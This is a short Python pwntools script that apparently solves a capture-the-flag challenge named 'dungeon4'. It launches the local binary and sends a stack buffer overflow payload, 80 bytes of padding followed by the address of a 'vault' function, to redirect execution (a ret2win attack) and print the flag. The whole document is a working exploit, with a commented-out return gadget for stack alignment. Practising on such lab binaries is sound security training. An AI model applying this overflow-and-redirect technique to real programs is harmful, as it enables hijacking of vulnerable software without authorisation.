import re
from pwn import *

context.bits = 64

elf = ELF('./dungeon4')

p = process("./dungeon4")

#Prepare the payload
payload = b"A"*80                   #creates the junk part of the payload
#payload += p64(0x400607)            #ret address ROP chain. Necessary because we are in Ubuntu 20.04 64bits
payload += p64(elf.symbols.vault) #address to ret2win() function
# Send the payload
#p.sendline(payload)                 #send the payload to the process

banner = p.read(1024)
print(banner)

p.sendline(payload)
banner = p.read(1024)
print(banner)
#response = p.recvall()              #gets all messages in the process
#print(re.search("(ROPE{.*?})",response.decode()))
